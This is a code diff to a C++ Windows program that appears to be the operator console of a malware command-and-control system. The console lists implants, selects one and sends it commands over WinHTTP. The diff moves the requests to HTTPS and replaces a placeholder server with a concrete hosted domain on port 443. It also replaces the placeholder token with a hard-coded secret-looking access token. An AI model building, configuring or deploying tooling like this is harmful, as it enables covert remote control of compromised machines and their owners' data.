@@ -22,7 +22,8 @@ static std::string HttpPost(const std::wstring& host, int port,
     if (!s) return {};
     HINTERNET c = WinHttpConnect(s, host.c_str(), (INTERNET_PORT)port, 0);
     HINTERNET r = WinHttpOpenRequest(c, L"POST", path.c_str(),
-        nullptr, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
+        nullptr, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
+        WINHTTP_FLAG_SECURE);
     std::wstring hdr = L"X-Token: " + token +
                        L"\r\nContent-Type: application/json";
     WinHttpSendRequest(r, hdr.c_str(), -1, (LPVOID)body.data(),
@@ -47,7 +48,8 @@ static std::string HttpGet(const std::wstring& host, int port,
     if (!s) return {};
     HINTERNET c = WinHttpConnect(s, host.c_str(), (INTERNET_PORT)port, 0);
     HINTERNET r = WinHttpOpenRequest(c, L"GET", path.c_str(),
-        nullptr, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
+        nullptr, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
+        WINHTTP_FLAG_SECURE);
     std::wstring hdr = L"X-Token: " + token;
     WinHttpSendRequest(r, hdr.c_str(), -1, nullptr, 0, 0, 0);
     WinHttpReceiveResponse(r, nullptr);
@@ -76,9 +78,9 @@ static std::vector<std::string> ListImplants(const std::string& json) {
 }
 
 int main() {
-    std::wstring HOST  = L"your-vps.example.net";
-    int          PORT  = 8080;
-    std::wstring TOKEN = L"CHANGE_ME_LONG_RANDOM";
+    std::wstring HOST  = L"aellee.pythonanywhere.com";
+    int          PORT  = 443;
+    std::wstring TOKEN = L"aF4tY8uJ6hG1dS3zq3nR7wL2vB5";
 
     std::cout << "=== panel v1 ===\n";
     std::cout << "commands: list, use <id>, send <cmd>, results, exit, help\n\n";
